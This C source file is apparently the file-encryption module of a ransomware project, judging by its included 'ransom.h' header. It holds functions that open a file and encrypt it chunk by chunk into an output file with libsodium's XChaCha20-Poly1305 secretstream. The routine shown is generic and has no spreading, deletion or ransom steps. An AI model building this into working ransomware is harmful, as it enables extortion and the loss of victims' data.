#include "ransom.h"
#include <sodium/crypto_secretstream_xchacha20poly1305.h>
#include <sodium/utils.h>
#include <stdio.h>
#include <stdlib.h>

bool init_encryption(FILE **to_encrypt, FILE **encrypted,
    const char *filepath, const char *optfilepath)
{
    *to_encrypt = fopen(filepath, "rb");
    if (!*to_encrypt)
        return false;

    *encrypted = fopen(optfilepath, "wb");
    if (!*encrypted) {
        fclose(*to_encrypt);
        return false;
    }

    return true;
}

int write_header(unsigned char *generated_key, FILE **to_encrypt,
    FILE **encrypted, crypto_secretstream_xchacha20poly1305_state *st)
{
    unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];

    if (crypto_secretstream_xchacha20poly1305_init_push(
            st, header, generated_key) != 0)
        return -1;

    if (fwrite(header, 1, sizeof header, *encrypted)
        != sizeof header)
        return -1;

    return 0;
}

int encryption_loop(FILE *to_encrypt, FILE *encrypted,
    crypto_secretstream_xchacha20poly1305_state st)
{
    unsigned char buf_in[CHUNK_SIZE];
    unsigned char buf_out[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
    size_t rlen;
    int eof = 0;

    while (!eof) {
        rlen = fread(buf_in, 1, sizeof buf_in, to_encrypt);

        if (rlen < sizeof buf_in) {
            if (feof(to_encrypt))
                eof = 1;
            else
                return -1;
        }

        unsigned char tag = eof ? crypto_secretstream_xchacha20poly1305_TAG_FINAL : 0;

        if (crypto_secretstream_xchacha20poly1305_push(
                &st, buf_out, NULL, buf_in, rlen, NULL, 0, tag) != 0)
            return -1;

        if (fwrite(buf_out, 1, rlen + crypto_secretstream_xchacha20poly1305_ABYTES, encrypted)
            != rlen + crypto_secretstream_xchacha20poly1305_ABYTES)
            return -1;
    }
    return 0;
}
